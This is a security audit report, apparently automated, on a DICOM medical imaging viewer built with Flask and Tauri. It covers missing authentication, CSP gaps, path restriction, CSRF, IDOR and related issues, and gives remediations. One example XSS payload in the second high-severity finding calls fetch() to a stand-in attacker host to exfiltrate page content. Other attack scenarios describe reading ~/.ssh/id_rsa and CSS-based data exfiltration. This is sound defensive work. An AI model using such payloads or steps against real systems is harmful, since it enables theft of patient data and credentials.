# Security Audit Report

**Project**: DICOM Medical Imaging Viewer
**Auditor**: Senior Application Security Engineer (automated)
**Date**: 2026-03-10
**Scope Version**: Branch `codex/fix-rgb-secondary-capture-rendering`

---

## Scope

All major components reviewed: `app.py`, `docs/index.html`, all `docs/js/app/*.js` modules, `docs/js/api.js`, `docs/js/config.js`, `docs/js/tauri-compat.js`, `desktop/src-tauri/tauri.conf.json`, `desktop/src-tauri/capabilities/default.json`, `desktop/src-tauri/src/decode.rs`, `desktop/src-tauri/Cargo.toml`, `.github/workflows/pr-validate.yml`, `requirements.txt`, `package.json`.

---

## Threat Model Summary

**Assets**: DICOM PHI (patient names, IDs, study data), clinical annotations (comments, descriptions) in SQLite/localStorage, uploaded report files, local filesystem paths through library/Tauri APIs, integrity of rendered medical images.

**Threat actors**: Anonymous web attacker reaching a network-exposed Flask instance, malicious DICOM file supplier, compromised supply chain dependency, local unprivileged process reading localStorage/SQLite, CI/CD pipeline attacker.

**Attack surface**: Flask HTTP API (notes CRUD, file upload, library config, report download), DICOM file parsing, DOM rendering from DICOM metadata, localStorage, Tauri IPC bridge, GitHub Actions workflow, third-party dependencies.

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 3 |
| Medium | 4 |
| Low | 7 |
| **Total** | **14** |

**Priority order**: (1) Flask API authentication, (2) Content Security Policy, (3) Library config path restriction, (4) CSRF headerless bypass, (5) localStorage path trust in desktop, (6) Rate limiting, (7) Report ID IDOR, (8) remaining Low findings.

---

## Findings

### HIGH-1 -- Flask API Lacks Authentication: Any Local or Network Process Can Read and Write PHI-Adjacent Data

- **Category**: A07 Identification and Authentication Failures / A01 Broken Access Control
- **Location**: `app.py:928-1293` (all `/api/notes/*` routes), `app.py:704-817` (library routes), `app.py:1326`
- **Description**: The Flask server exposes a full CRUD API for clinical notes, comments, study descriptions, and report file upload/download with zero authentication. Any process that can reach the server can read all stored annotations and upload or delete reports. The server can be configured to bind to `0.0.0.0` via `FLASK_HOST=0.0.0.0`, at which point every device on the local network gains unrestricted access. Even on `127.0.0.1`, any locally running process -- malware, a browser extension, another local user -- can call these endpoints without any credential.
- **Attack Scenario**:
  1. User sets `FLASK_HOST=0.0.0.0` for LAN access (or a local process is malicious).
  2. Attacker calls `GET /api/notes/?studies=<uid>` to read all clinical annotations.
  3. Attacker calls `POST /api/notes/<study_uid>/reports` to inject files into the reports directory, or `DELETE` to destroy records.
  4. Attacker POSTs to `/api/library/config` with `{"folder": "/"}` to force the server to scan the entire filesystem.
- **Evidence**:
  ```python
  # app.py:1326
  host = '0.0.0.0' if os.environ.get('FLASK_HOST') == '0.0.0.0' else '127.0.0.1'

  # app.py:928 -- no auth decorator
  @app.route('/api/notes/', methods=['GET'])
  def get_notes():
      ...
      payload = _build_notes_payload(study_uids, db)
      return jsonify({'studies': payload})
  ```
- **Remediation**: Add a shared-secret API key mechanism (auto-generated on first run, stored in `settings.json`, required as `X-DICOM-API-Key` header on all state-modifying requests). Bind to `127.0.0.1` by default with an explicit warning when `0.0.0.0` is requested. Document the no-authentication threat model clearly.
- **References**: CWE-306, OWASP A07:2021

---

### HIGH-2 -- No Content Security Policy on Flask-Served and GitHub Pages Deployments

- **Category**: A05 Security Misconfiguration / A03 Injection (XSS defense-in-depth)
- **Location**: `app.py:141-146`, `docs/index.html` (no CSP meta tag)
- **Description**: The Flask security header middleware sets only `X-Content-Type-Options` and `X-Frame-Options`. No `Content-Security-Policy` header is emitted. `docs/index.html` also contains no CSP `<meta>` tag. The Tauri desktop shell has a strong CSP (no `unsafe-eval`); this disparity means the same codebase has very different XSS exposure across deployment modes. Any future missed `escapeHtml` call in DICOM metadata rendering would be uncontained on the web deployment.
- **Attack Scenario**: A future code change introduces an unescaped DICOM metadata field. An attacker crafts a DICOM file with a tag value containing `<script>fetch('https://attacker.example/steal?d='+btoa(document.body.innerHTML))</script>`. On personal or demo mode, the script executes with no CSP to block it.
- **Evidence**:
  ```python
  # app.py:141-146 -- no CSP header
  @app.after_request
  def _set_security_headers(response):
      response.headers['X-Content-Type-Options'] = 'nosniff'
      response.headers['X-Frame-Options'] = 'SAMEORIGIN'
      return response
  ```
  Compare to `tauri.conf.json:33` which has a full CSP with `script-src 'self' 'wasm-unsafe-eval'`.
- **Remediation**: Add CSP in Flask `_set_security_headers`: `Content-Security-Policy: default-src 'self' data: blob:; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; worker-src 'self' blob: 'wasm-unsafe-eval'; img-src 'self' data: blob:; connect-src 'self'; frame-src blob:;`. Add an equivalent `<meta http-equiv="Content-Security-Policy">` in `docs/index.html` for GitHub Pages coverage. Also add `Referrer-Policy: no-referrer` and `Permissions-Policy: camera=(), microphone=(), geolocation=()`.
- **References**: CWE-693, OWASP A05:2021

---

### HIGH-3 -- Library Config API Accepts Arbitrary Filesystem Paths Without Scope Restriction

- **Category**: A01 Broken Access Control / Path Traversal
- **Location**: `app.py:711-767` (`update_library_config`), `app.py:600-613` (`get_safe_slice_path`)
- **Description**: `POST /api/library/config` accepts a user-supplied `folder` path, expands it with `os.path.expanduser()`, and uses it as the root for recursive DICOM scanning. There is no restriction on which filesystem directories can be specified -- `/`, `/etc`, `/home`, or any other readable path is accepted. While `get_safe_slice_path` correctly prevents path traversal *within* the scan results, it does not prevent the root from being set to a sensitive location. The scan uses `folder.rglob('*')` on the configured root and attempts to parse every file as DICOM, disclosing directory structure and any parseable DICOM files found anywhere.
- **Attack Scenario**: Attacker sends `POST /api/library/config {"folder": "/"}`. Server accepts because `/` passes `os.path.isdir()` and `os.access()`. Server scans the entire filesystem. `GET /api/library/studies` exposes metadata from every DICOM file on the disk. `GET /api/library/dicom/<study>/<series>/0` serves raw DICOM bytes from anywhere pydicom successfully parsed.
- **Evidence**:
  ```python
  # app.py:721-728 -- no allowlist or prefix restriction
  folder_raw = folder.strip()
  folder_path = os.path.expanduser(folder_raw)

  if not os.path.isdir(folder_path):
      return jsonify({'error': ...}), 400
  if not os.access(folder_path, os.R_OK | os.X_OK):
      return jsonify({'error': ...}), 400
  # accepted unconditionally
  ```
- **Remediation**: Restrict the configured path to be within `Path.home()` at minimum: `assert Path(folder_path).resolve().is_relative_to(Path.home())`. Better: maintain a configurable allowlist of permitted root directories. Consider whether this endpoint needs to be web-accessible at all vs. environment variable only.
- **References**: CWE-22, CWE-284, OWASP A01:2021

---

### MEDIUM-1 -- CSRF Protection Allows Headerless Requests

- **Category**: A01 Broken Access Control / A04 Insecure Design
- **Location**: `app.py:111-138` (`_csrf_origin_check`)
- **Description**: The CSRF middleware only blocks requests that include an `Origin` or `Referer` header pointing to a different host. Requests with *neither* header pass unconditionally. This is documented as intentional for CLI/Playwright, but it means any locally running process can perform all state-modifying operations (insert comments, upload files, delete reports) without any credential or origin, bypassing CSRF entirely.
- **Attack Scenario**: Malicious software on the same machine sends a headerless `POST /api/notes/<study_uid>/comments` with arbitrary clinical annotation text. The CSRF check passes. The comment is inserted into the database.
- **Evidence**:
  ```python
  # app.py:134 -- no-origin requests skip all checks
  if origin:  # only checks if origin is present
      origin_host = urlparse(origin).netloc
      if origin_host != server_host:
          return jsonify({'error': 'Cross-origin request blocked'}), 403
  ```
- **Remediation**: Issue a secret token on server startup (written to a local file or stdout). Require it as `X-DICOM-Viewer-Token` on all state-modifying requests. CLI tools and tests read it; browser CSRF attacks cannot. Alternatively, restrict headerless requests to `127.0.0.1` source IP only.
- **References**: CWE-352, OWASP A01:2021

---

### MEDIUM-2 -- DesktopBackend Uses File Path from localStorage Without Re-Validation Against Tauri Scope

- **Category**: A01 Broken Access Control
- **Location**: `docs/js/api.js:337-345` (`DesktopBackend.getReportFileUrl`)
- **Description**: When a report is uploaded in desktop mode, the resolved file path is stored in localStorage. On retrieval, `getReportFileUrl` reads this `filePath` back from localStorage and passes it directly to `core.convertFileSrc(filePath)` without re-validating against the current Tauri scope. If localStorage is tampered with (via XSS, a malicious browser extension, or physical access), an attacker can replace `filePath` with an arbitrary path. `core.convertFileSrc` converts it to an `asset://` URL, and if `persisted-scope` has expanded the asset scope beyond `$APPDATA/reports/**`, the target file's contents are served into the webview.
- **Attack Scenario**: XSS payload reads localStorage, replaces a report's `filePath` with `~/.ssh/id_rsa`. User opens that report. `convertFileSrc` converts the path to `asset:///Users/victim/.ssh/id_rsa`. If scope includes home directories (expanded by a prior DICOM folder open), the file contents are returned.
- **Evidence**:
  ```javascript
  // docs/js/api.js:337-345
  getReportFileUrl(reportId) {
      const match = findReportMetadata(loadStore(), reportId);
      const filePath = match?.report?.filePath;  // read from localStorage
      if (!filePath) return '';
      return core.convertFileSrc(filePath);  // used directly
  }
  ```
- **Remediation**: Before calling `convertFileSrc`, validate that `filePath` is within `$APPDATA/reports/`. Alternatively, store only the report `id` in localStorage and reconstruct the expected path from `path.join(appDataDir, 'reports', sanitizeFilenamePart(id) + '.' + ext)` at retrieval time -- never trusting any stored path.
- **References**: CWE-22, CWE-79 (XSS enabler), OWASP A01:2021

---

### MEDIUM-3 -- No Rate Limiting on Notes API

- **Category**: A04 Insecure Design / Denial of Service
- **Location**: `app.py:1003-1032` (`add_comment`), `app.py:1077-1165` (`upload_report`)
- **Description**: No rate limiting is applied to any Flask endpoint. `add_comment` accepts unbounded POST requests, allowing flooding the SQLite database and filling disk. `upload_report` accepts files up to 50MB per request with no total quota, allowing disk exhaustion. Comment text has no length cap beyond whitespace trimming.
- **Attack Scenario**: Attacker sends a tight loop of `POST /api/notes/<uid>/comments` or 50MB file uploads. Disk fills; application becomes unresponsive.
- **Evidence**: `app.py:1021` inserts directly with no frequency or count check. `app.py:62`: `MAX_CONTENT_LENGTH = 50 * 1024 * 1024` limits per-request size but no total quota exists.
- **Remediation**: Add per-IP rate limiting (Flask-Limiter or in-memory token bucket). Add a maximum comment count per study (e.g., 1000). Add a total reports directory size quota. Cap comment text length (e.g., 10,000 characters).
- **References**: CWE-770, OWASP A04:2021

---

### MEDIUM-4 -- PHI-Adjacent Data Stored Unencrypted in localStorage

- **Category**: A02 Cryptographic Failures / Sensitive Data Exposure
- **Location**: `docs/js/api.js:46-66`, key `'dicom-viewer-notes-v3'`
- **Description**: Clinical annotations (study/series descriptions, user comments, report metadata including file paths) are stored in localStorage in plaintext. localStorage is accessible to all same-origin JavaScript, stored in plaintext on disk in browser profile directories, not cleared on browser close, and readable by other users on shared machines via the filesystem. Study UIDs combined with descriptions and file paths can constitute PHI linkage.
- **Attack Scenario**: On a shared workstation, User A adds clinical comments. User B reads the SQLite localStorage database file (e.g., `~/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb/`) and reads all stored patient annotations in plaintext.
- **Evidence**: `localStorage.setItem(STORAGE_KEY, JSON.stringify(store))` where `store` contains `studyUid`, clinical comments, and report file paths.
- **Remediation**: Display a clear disclosure that annotations are stored unencrypted. For the desktop app, migrate from localStorage to Tauri app data directory (protected by OS-level encryption like FileVault). Offer a session-on-close option to clear localStorage. Document prominently in user-facing documentation.
- **References**: CWE-312, HIPAA 45 CFR 164.312(a)(2)(iv), OWASP A02:2021

---

### LOW-1 -- `unsafe-inline` in Tauri CSP style-src Weakens XSS Defense

- **Category**: A05 Security Misconfiguration
- **Location**: `desktop/src-tauri/tauri.conf.json:33`
- **Description**: The Tauri CSP uses `'unsafe-inline'` for `style-src`. While `script-src` correctly excludes `unsafe-eval`, the `unsafe-inline` style permission allows CSS injection attacks: a blocked XSS payload can inject `<style>` blocks using CSS attribute selectors to exfiltrate sensitive DOM text (patient names, study UIDs) via `background-image` requests to attacker-controlled URLs.
- **Evidence**: `"csp": "... style-src 'self' 'unsafe-inline'; ..."` in `tauri.conf.json:33`.
- **Remediation**: Audit `docs/index.html` for `style=""` HTML attributes. If none remain, remove `unsafe-inline` from `style-src`.
- **References**: CWE-693, CSS Injection (WSTG-CLNT-005)

---

### LOW-2 -- GitHub Actions Uses Tag-Pinned (Not SHA-Pinned) Actions

- **Category**: A06 Vulnerable and Outdated Components / Supply Chain
- **Location**: `.github/workflows/pr-validate.yml:27,30,35,43,74,93,99,103`
- **Description**: All actions use mutable version tags (`actions/checkout@v4`, etc.) rather than immutable SHA hashes. `dtolnay/rust-toolchain@stable` is a floating reference. A compromised action maintainer can update these tags to malicious code, which would execute in the CI context with access to `GITHUB_TOKEN` and all repository secrets.
- **Evidence**: `uses: actions/checkout@v4`, `uses: dtolnay/rust-toolchain@stable`
- **Remediation**: Pin each action to a full commit SHA. Use `pinact` or Dependabot (`package-ecosystem: github-actions`) to automate.
- **References**: CWE-1357, SLSA Supply Chain Framework

---

### LOW-3 -- Rust and npm Dependencies Use Semver Ranges

- **Category**: A06 Vulnerable and Outdated Components / Supply Chain
- **Location**: `desktop/src-tauri/Cargo.toml:13-26`, `package.json`
- **Description**: Rust dependencies use semver ranges (`dicom-core = "0.9"`, `tauri = "2"`, `tokio = "1"`). While `Cargo.lock` pins at build time, the lock file is not enforced in CI with `--locked`. Python dependencies are correctly exactly pinned.
- **Remediation**: Ensure `Cargo.lock` is committed. Use `cargo build --locked` in CI. Add `cargo audit` to the CI pipeline for RustSec advisories.
- **References**: CWE-1357, OWASP A06:2021

---

### LOW-4 -- `generateUUID` Uses `Math.random()` (Not Cryptographically Secure)

- **Category**: A02 Cryptographic Failures
- **Location**: `docs/js/app/utils.js:30-35`
- **Description**: Local report IDs are generated with `Math.random()`, which is predictable. In practice the risk is low because the server-side fallback uses `uuid.uuid4()` and the lack of authentication already grants full API access.
- **Evidence**: `const r = Math.random() * 16 | 0;` in `generateUUID`.
- **Remediation**: Replace with `crypto.randomUUID()` (available in all modern browsers and Node.js 19+).
- **References**: CWE-338, OWASP A02:2021

---

### LOW-5 -- `help-viewer.js` Injects Static HTML as `innerHTML` (Defense-in-Depth Risk)

- **Category**: A03 Injection (XSS -- currently low risk)
- **Location**: `docs/js/app/help-viewer.js:48`
- **Description**: `section.content` is injected as `innerHTML` without escaping. The source is a static constant in `help-content.js` (not user input), so there is no current XSS risk. The danger is that if `HELP_SECTIONS` is ever populated from an external source, this becomes an immediate XSS sink.
- **Evidence**: `${section.content}` injected without `escapeHtml()` on line 48.
- **Remediation**: Add DOMPurify sanitization or an ESLint `no-unsanitized` rule to flag direct `innerHTML` assignments that bypass `escapeHtml`. Add a code comment warning against changing the source of `section.content`.
- **References**: CWE-79, OWASP A03:2021

---

### LOW-6 -- Flask Runs with Development Server

- **Category**: A05 Security Misconfiguration
- **Location**: `app.py:1339`
- **Description**: `app.run()` uses Werkzeug's development server, which is single-threaded and not designed for production load. Acceptable for single-user localhost; problematic for network-exposed or multi-user scenarios.
- **Evidence**: `app.run(debug=debug, host=host, port=port)`
- **Remediation**: Document that production/LAN deployments should use `gunicorn -w 1 -b 127.0.0.1:5001 app:app`. Add a startup warning if `host == '0.0.0.0'` and the development server is in use.
- **References**: Flask Deployment Documentation

---

### LOW-7 -- Report ID IDOR: Client-Supplied ID Can Overwrite Reports Across Studies

- **Category**: A01 Broken Access Control (IDOR)
- **Location**: `app.py:1086-1087`, `app.py:1124-1138`
- **Description**: The report upload endpoint accepts a client-supplied `id`. On conflict, the SQL `ON CONFLICT(id) DO UPDATE` replaces the `study_uid` unconditionally, allowing a caller who knows any existing report ID to reassign it to a different study or overwrite its file.
- **Attack Scenario**: User A uploads a report with ID `abc12345` for Study X. Attacker sends the same ID for Study Y. The SQL update reassigns the report to Study Y and overwrites the file.
- **Evidence**:
  ```python
  provided_id = request.form.get('id')
  report_id = _sanitize_report_id(provided_id) or str(uuid.uuid4())
  # ON CONFLICT DO UPDATE SET study_uid=excluded.study_uid -- no ownership check
  ```
- **Remediation**: On conflict, verify `study_uid` in the existing record matches the current request before updating. Or generate IDs server-side only and ignore client-supplied IDs.
- **References**: CWE-639, OWASP A01:2021

---

## Positive Observations

- `escapeHtml()` is consistently applied in all innerHTML-rendering code paths; `studyTitle.textContent` correctly uses `textContent` for patient-identifying fields.
- Every SQL query uses parameterized queries with `?` placeholders -- no string concatenation anywhere.
- `get_safe_slice_path` uses `Path.resolve()` + `is_relative_to()` for path traversal prevention; `get_report_file` applies the same check after reading from DB.
- Rust `validate_decode_path` uses `canonicalize()` + `app.fs_scope().is_allowed()` for all IPC file operations.
- Tauri CSP correctly excludes `unsafe-eval`, permitting only `wasm-unsafe-eval` for the JPEG 2000 WASM decoder.
- Tauri capabilities file limits fs access to `$APPDATA/reports/**` and `$APPDATA/decode-cache/**` -- least privilege.
- Decode operations have a 30-second timeout; cache is bounded at 1000 entries / 500MB with LRU eviction.
- Symlink skipping and cycle detection in desktop folder scanning prevent traversal and loop attacks.
- Python dependencies are exactly pinned (`flask==3.1.2`, `pydicom==3.0.1`).
- All JavaScript libraries are vendored locally -- no CDN dependencies, no SRI hash risk.
- Report upload uses atomic write (temp + `shutil.move`), 50MB size limit, strict type allowlist (pdf/png/jpg only), and regex-validated report IDs.
- `CONFIG` is frozen with `Object.freeze()` -- prevents runtime tampering of deployment mode and feature flags.
- CSRF middleware correctly compares `request.host` (including port) to prevent host header injection bypass.
